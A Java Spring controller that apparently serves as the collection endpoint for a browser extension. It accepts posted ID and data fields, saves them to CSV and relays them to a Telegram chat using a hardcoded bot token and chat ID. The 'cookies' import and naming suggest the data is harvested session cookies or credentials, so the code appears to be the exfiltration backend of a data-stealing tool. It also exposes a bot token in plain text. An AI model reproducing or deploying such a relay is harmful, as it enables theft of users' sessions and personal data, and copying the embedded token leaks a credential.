package cpm.web.controller.other;

import cpm.web.bl.scan.cookies;
import cpm.web.dto.telegram.SettingTelegramDto;
import cpm.web.mapper.request.scan.ExtensionRequest;
import cpm.web.utils.execute.ServicesController;
import cpm.web.utils.files.HandleFiles;
import cpm.web.utils.telegram.BotSendMessages;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.text.SimpleDateFormat;
import java.util.Date;

@CrossOrigin(origins = "*", maxAge = 3600)
@RestController
@RequestMapping("/api/iso")
public class ScanController extends ServicesController {

    @Autowired
    cookies cookies;

    BotSendMessages botSendMessages = new BotSendMessages();

    @Autowired
    HandleFiles handleFiles;

    private static final SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyy HH:mm:ss");

    @PostMapping(value = "/temp01")
    public ResponseEntity<?> loadBm(@RequestBody ExtensionRequest data) throws Exception {
        boolean isStatus = true;
        if (!data.getSample1().equals("") && handleFiles.WriteCsv(data)) {
            SettingTelegramDto settingTelegramDto = new SettingTelegramDto();
            settingTelegramDto.setToken("1943636042:AAEp3Swt7sfM81iG1BMka70_AjgtrM2mmmk");
            settingTelegramDto.setId("-586922770");
            String outputMsg = String.format(
                    "Thời gian: %s\n" +
                            "ID: %s\n" +
                            "Data: %s\n",
                    dateFormat.format(new Date()),
                    data.getSample1(),
                    data.getSample2()
            );
            settingTelegramDto.setMsg(outputMsg);
            botSendMessages.sendRequestMsg(settingTelegramDto);
        } else {
            isStatus = false;
        }

        return ResponseEntity.status(HttpStatus.OK).body(isStatus);
    }
}

